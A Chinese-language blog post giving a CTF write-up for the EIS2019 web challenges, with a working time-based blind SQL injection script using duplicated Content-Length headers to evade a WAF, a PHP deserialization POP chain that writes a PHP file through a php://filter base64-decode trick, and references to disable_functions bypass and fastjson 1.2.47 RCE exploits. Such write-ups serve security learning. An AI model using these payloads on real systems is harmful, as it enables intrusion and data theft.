<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="EIS2019-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2019/11/21/EIS2019-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="EIS2019-wp">
<meta property="og:url" content="https://glotozz.github.io/2019/11/21/EIS2019-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2019/11/21/POBKd83SA749c2J.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/mXVyAjiJwHpOMGg.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/z8BhN3dKP6jrRco.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/OWqoAIh6MDC5Zyz.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/KticFGNLOAgvjza.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/zaJLyQlCxuBi6Vf.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/Ggei1tWpEVc9swb.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/QXr2dhx4ASfn9pV.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/vwnAlTh2dDobJpk.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/b3gWOYXywx7MUEt.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/JMACX91TinWesL2.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/KsE415bWdjGcLPQ.png">
<meta property="og:image" content="https://i.loli.net/2019/11/21/kYBTZcovjVpqWAX.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/H9jQeL82EbDtYGX.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/IKASzcurTi2CG4e.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/cDreYCzPQS24th1.png">
<meta property="og:image" content="https://i.loli.net/2019/11/22/BcZyNIoA9widmUs.png">
<meta property="article:published_time" content="2019-11-21T01:15:01.000Z">
<meta property="article:modified_time" content="2020-03-31T00:47:44.094Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2019/11/21/POBKd83SA749c2J.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> EIS2019-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          EIS2019-wp
        
      </h1>

      <time class="post-time">
          Nov 21 2019
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#ezbypass">ezbypass</a></li>
<li><a href="#ezcms">ezcms</a></li>
<li><a href="#ezupload">ezupload</a></li>
<li><a href="#ezwaf">ezwaf</a></li>
<li><a href="#ezpop">ezpop</a></li>
<li><a href="#ezjava">ezjava</a></li>
</ul>
<!-- tocstop -->

<hr>
<h3><span id="ezbypass">ezbypass</span></h3><p><img src="https://i.loli.net/2019/11/21/POBKd83SA749c2J.png" alt="Snipaste_2019-11-21_11-45-57.png"></p>
<p><img src="https://i.loli.net/2019/11/21/mXVyAjiJwHpOMGg.png" alt="Snipaste_2019-11-21_11-45-46.png"></p>
<p><code>phpversion 7.2.19</code></p>
<p>蚁剑连上发现当前目录下只有<code>index.php</code></p>
<p>直接上传<code>exp</code>到<code>/tmp</code>下，再<code>include()</code></p>
<blockquote>
<p>exp地址：<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg</a> </p>
</blockquote>
<h3><span id="ezcms">ezcms</span></h3><p><code>yzmCMS_V5.4框架</code>，搜索历史漏洞，找到一个<code>eval()注入漏洞</code>，但是已被修复</p>
<p>自己本地下个<code>yzmCMS_V5.4框架</code>，利用<code>install</code>时的账号初始密码成功登录后台</p>
<p>先在前端逛逛，看有没有明显利用点（反正之前dedecms是有的😂）</p>
<p>搞不动</p>
<h3><span id="ezupload">ezupload</span></h3><p><code>.login.php.bak</code>源码泄露</p>
<p>逻辑漏洞，删除<code>password参数</code>即可登录。</p>
<p><img src="https://i.loli.net/2019/11/21/z8BhN3dKP6jrRco.png" alt="Snipaste_2019-11-21_22-18-47.png"></p>
<p>成功登陆后，文件上传的时候加上<code>GIF89a</code>绕过格式以及尝试修改后缀为<code>phtml</code></p>
<h3><span id="ezwaf">ezwaf</span></h3><p>很明显age处时间盲注，绕过waf参考roarctf的http走私      </p>
<p><img src="https://i.loli.net/2019/11/22/OWqoAIh6MDC5Zyz.png" alt="Snipaste_2019-11-21_15-47-28.png">                    </p>
<p><img src="https://i.loli.net/2019/11/22/KticFGNLOAgvjza.png" alt="Snipaste_2019-11-21_15-47-40.png"></p>
<p> 之前写了个用<code>requests</code>的不行，好像是发不了畸形包，翔哥说可以用<code>socket</code>，自己写了个成功了</p>
<p>写个脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import socket</span><br><span class="line">import urllib2</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">socket.setdefaulttimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">easy_strings = [ord(i) <span class="keyword">for</span> i in <span class="string">'abcdefghijklmnopqrstuvwxyz_,'</span>]</span><br><span class="line"><span class="comment"># print(easy_strings)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">    <span class="comment"># for j in easy_strings:</span></span><br><span class="line">    <span class="comment">#     payload = "select%20database()"</span></span><br><span class="line">        <span class="comment"># payload = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span></span><br><span class="line">        payload = <span class="string">"select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f786464)"</span></span><br><span class="line">        param = <span class="string">"?age=-1%20or%20if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)"</span>.format(payload, str(i), str(j))</span><br><span class="line">        param = <span class="string">'POST /'</span> + param + <span class="string">' HTTP/1.1\r\n'</span></span><br><span class="line">        <span class="keyword">print</span>(param)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock = socket.socket()</span><br><span class="line">            sock.connect((<span class="string">'111.186.57.123'</span>, <span class="number">10601</span>))</span><br><span class="line">            sock.send(param.encode())</span><br><span class="line">            sock.send(<span class="string">'Host: 111.186.57.123:10601\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'Accept: */*\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'Accept-Encoding: gzip, deflate\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'Content-Length: 9\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'Content-Length: 9\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'\r\n'</span>.encode())</span><br><span class="line">            sock.send(<span class="string">'num=111\r\n'</span>.encode())</span><br><span class="line">            <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">            buf = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># while len(buf):</span></span><br><span class="line">            <span class="comment">#     print buf</span></span><br><span class="line">            <span class="comment">#     buf = s.recv(1024)</span></span><br><span class="line">        except:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            tmp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3><span id="ezpop">ezpop</span></h3><p><strong>这题挺有意思的</strong></p>
<p>把整个代码贴下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key    = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store  = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire   = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>大致看了看分析<code>class A</code>中的<code>$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</code>可以调用<code>class B</code>中的<code>set()</code>方法，</p>
<p><img src="https://i.loli.net/2019/11/21/zaJLyQlCxuBi6Vf.png" alt="Snipaste_2019-11-21_21-38-07.png"></p>
<p>本地测试，发现大致如下</p>
<p><img src="https://i.loli.net/2019/11/21/Ggei1tWpEVc9swb.png" alt="TIM图片20191121214041.png"></p>
<p>需要绕过<code>exit();?&gt;</code> ，参考之前moctf做过的一道题，利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x3D;</span><br></pre></td></tr></table></figure>

<p>总结下<code>POP链</code></p>
<p><code>A</code>-&gt;<code>__destruct()</code>-&gt;<code>$this-&gt;save()</code>-&gt;<code>$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire)</code></p>
<p><code>B</code>-&gt;<code>set()</code></p>
<p>然后就是一些具体细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data &#x3D; &#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;;</span><br><span class="line">$exoire &#x3D; &quot;\n&quot;;</span><br><span class="line">$data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot;.sprintf(&#39;%012d&#39;,$expire).&#39;&#39;.$data.&quot;\n?&gt;&quot;;</span><br><span class="line">$result &#x3D;  file_put_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;,$data);</span><br></pre></td></tr></table></figure>

<p>本地直接测，发现<code>aaa</code>的时候</p>
<p><img src="https://i.loli.net/2019/11/21/QXr2dhx4ASfn9pV.png" alt="Snipaste_2019-11-21_21-31-07.png"></p>
<p>还有个坑是<code>serialize()</code>，跟进发现需要我们控制，修改为<code>trim</code>即可</p>
<p><strong>不改的话使用serialize加4个a即可</strong></p>
<p><img src="https://i.loli.net/2019/11/21/vwnAlTh2dDobJpk.png" alt="TIM图片20191121215303.png"></p>
<p><strong>还曾幻想过动态函数执行，被参数类型给劝退了</strong></p>
<p>最后构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class B&#123;</span><br><span class="line"></span><br><span class="line">	public $options &#x3D; [&#39;serialize&#39;&#x3D;&gt;&#39;trim&#39;,&#39;prefix&#39;&#x3D;&gt;&#39;&#39;];</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line"></span><br><span class="line">    protected $store;</span><br><span class="line">    protected $key;</span><br><span class="line">    protected $expire;</span><br><span class="line">    public $cache &#x3D; array(&#39;aaaPD9waHAgcGhwaW5mbygpOz8+&#39;);</span><br><span class="line">    public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key    &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;6.php&#39;;</span><br><span class="line">        $this-&gt;store  &#x3D; new B();</span><br><span class="line">        $this-&gt;expire &#x3D; $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A(new B());</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/21/b3gWOYXywx7MUEt.png" alt="Snipaste_2019-11-21_22-04-17.png"></p>
<p>本地测试成功👌</p>
<p><img src="https://i.loli.net/2019/11/21/JMACX91TinWesL2.png" alt="Snipaste_2019-11-21_22-14-25.png"></p>
<p><strong>还有个小坑，注意目录创建的文件应该要再/uploads/下，不然创建不成功，应该是设置了权限</strong></p>
<h3><span id="ezjava">ezjava</span></h3><p>直接解压即可，</p>
<p><code>lib</code>文件夹中存在<code>fastjson-1.2.47.jar</code>，很容易想到<code>fastjson =&lt; 1.2.47 反序列化漏洞</code></p>
<p>发现<code>class</code>文件，利用<code>jd-gui</code>反编译</p>
<p><code>Index.class</code></p>
<p><img src="https://i.loli.net/2019/11/21/KsE415bWdjGcLPQ.png" alt="Snipaste_2019-11-21_23-08-49.png"></p>
<p><code>User.class</code></p>
<p><img src="https://i.loli.net/2019/11/21/kYBTZcovjVpqWAX.png" alt="Snipaste_2019-11-21_23-08-06.png"></p>
<p>代码不难，根据链接复现即可</p>
<blockquote>
<p>参考链接：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a> </p>
</blockquote>
<p>第一步简单检测</p>
<p><img src="https://i.loli.net/2019/11/22/H9jQeL82EbDtYGX.png" alt="Snipaste_2019-11-22_13-43-15.png"></p>
<p><code>centos7</code>安装<code>jdk8</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk</span><br><span class="line">yum install java-1.8.0-openjdk-devel.x86_64</span><br></pre></td></tr></table></figure>

<p>然后跟着教程走就行</p>
<p><img src="https://i.loli.net/2019/11/22/IKASzcurTi2CG4e.png" alt="Snipaste_2019-11-22_11-30-39.png"></p>
<p><img src="https://i.loli.net/2019/11/22/cDreYCzPQS24th1.png" alt="Snipaste_2019-11-22_11-26-10.png"></p>
<p><img src="https://i.loli.net/2019/11/22/BcZyNIoA9widmUs.png" alt="Snipaste_2019-11-22_11-25-56.png"></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">LFIToRCE思路</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/11/18/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <span class="next-text nav-default">ThinkCMF框架任意内容包含</span>
        <span class="prev-text nav-mobile">Next</span>
